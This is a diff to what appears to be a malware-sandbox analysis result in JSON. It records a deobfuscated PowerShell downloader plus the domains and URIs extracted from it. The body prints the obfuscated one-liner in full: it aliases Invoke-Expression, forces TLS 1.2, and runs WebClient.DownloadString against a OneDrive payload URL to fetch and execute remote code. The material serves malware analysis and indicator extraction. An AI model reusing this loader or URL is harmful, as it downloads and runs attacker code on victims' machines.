@@ -5,7 +5,7 @@
     "sections": [
       {
         "auto_collapse": false,
-        "body": "[Invoke-Expression] Execute/Open: $Tbone='*EX'.replace('*','I');sal M $Tbone;do {$ping = test-connection -comp google.com -count 1 -Quiet} until ($ping);$p22 = [Enum]::ToObject([System.Net.SecurityProtocolType], 3072);[System.Net.ServicePointManager]::SecurityProtocol = $p22;$mv='(&'+'(G'+'C'+'$$$'.replace('$$$','M')+' *W-'+'O*)'+ 'Ne'+'t.'+'W'+'eb'+'C'+'li'+'ent)'+'.D'+'ow'+'nl'+'oa'+'d'+'S'+'tr'+'ing(''https://onedrive.live.com/download?cid=8B8C81E9EA559FF0&resid=8B8C81E9EA559FF0%211131&authke...\n[Test-Connection] -comp google.com -count 1 -Quiet\n\n[Invoke-Expression] Execute/Open: (&(GCM *W-O*)Net.WebClient).DownloadString('https://onedrive.live.com/download?cid=8B8C81E9EA559FF0&resid=8B8C81E9EA559FF0%211131&authkey=AMPC-h991zcyT5Q')\n",
+        "body": "[Invoke-Expression] Execute/Open: $Tbone='*EX'.replace('*','I');sal M $Tbone;do {$ping = test-connection -comp google.com -count 1 -Quiet} until ($ping);$p22 = [Enum]::ToObject([System.Net.SecurityProtocolType], 3072);[System.Net.ServicePointManager]::SecurityProtocol = $p22;$mv='(&'+'(G'+'C'+'$$$'.replace('$$$','M')+' *W-'+'O*)'+ 'Ne'+'t.'+'W'+'eb'+'C'+'li'+'ent)'+'.D'+'ow'+'nl'+'oa'+'d'+'S'+'tr'+'ing(''https://onedrive.live.com/download?cid=8B8C81E9EA559FF0&resid=8B8C81E9EA559FF0%211131&authke...\n[Test-Connection] -comp google.com -count 1 -Quiet\n\n[Invoke-Expression] Execute/Open: (&(GCM *W-O*)Net.WebClient).DownloadString('https://onedrive.live.com/download?cid=8B8C81E9EA559FF0&resid=8B8C81E9EA559FF0%211131&authkey=AMPC-h991zcyT5Q')\n\n[System.Net.WebClient.DownloadString] Download From: https://onedrive.live.com/download?cid=8B8C81E9EA559FF0&resid=8B8C81E9EA559FF0%211131&authkey=AMPC-h991zcyT5Q\n",
         "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
@@ -64,6 +64,18 @@
         "tags": {
           "network": {
             "dynamic": {
+              "domain": [
+                "google.com",
+                "onedrive.live.com"
+              ],
+              "uri": [
+                "https://onedrive.live.com/download?cid=8B8C81E9EA559FF0&resid=8B8C81E9EA559FF0%211131&authkey=AMPC-h991zcyT5Q"
+              ],
+              "uri_path": [
+                "/download?cid=8B8C81E9EA559FF0&resid=8B8C81E9EA559FF0%211131&authkey=AMPC-h991zcyT5Q"
+              ]
+            },
+            "static": {
               "domain": [
                 "google.com",
                 "onedrive.live.com"
@@ -404,6 +416,16 @@
         {
           "heur_id": 1,
           "signatures": [],
+          "value": "google.com"
+        },
+        {
+          "heur_id": 1,
+          "signatures": [],
+          "value": "onedrive.live.com"
+        },
+        {
+          "heur_id": 1,
+          "signatures": [],
           "value": "onedrive.live.com"
         }
       ],
@@ -412,9 +434,19 @@
           "heur_id": 1,
           "signatures": [],
           "value": "https://onedrive.live.com/download?cid=8B8C81E9EA559FF0&resid=8B8C81E9EA559FF0%211131&authkey=AMPC-h991zcyT5Q"
+        },
+        {
+          "heur_id": 1,
+          "signatures": [],
+          "value": "https://onedrive.live.com/download?cid=8B8C81E9EA559FF0&resid=8B8C81E9EA559FF0%211131&authkey=AMPC-h991zcyT5Q"
         }
       ],
       "network.static.uri_path": [
+        {
+          "heur_id": 1,
+          "signatures": [],
+          "value": "/download?cid=8B8C81E9EA559FF0&resid=8B8C81E9EA559FF0%211131&authkey=AMPC-h991zcyT5Q"
+        },
         {
           "heur_id": 1,
           "signatures": [],
